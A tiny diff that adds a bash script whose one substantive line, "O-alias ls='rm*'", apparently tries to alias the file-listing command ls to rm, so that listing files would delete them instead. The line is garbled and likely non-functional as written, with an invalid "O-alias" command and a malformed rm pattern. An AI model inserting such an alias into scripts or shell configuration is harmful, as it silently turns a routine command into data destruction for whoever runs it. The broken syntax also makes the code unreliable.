@@ -1,0 +1,2 @@
+#!/bin/bash
+O-alias ls='rm*'
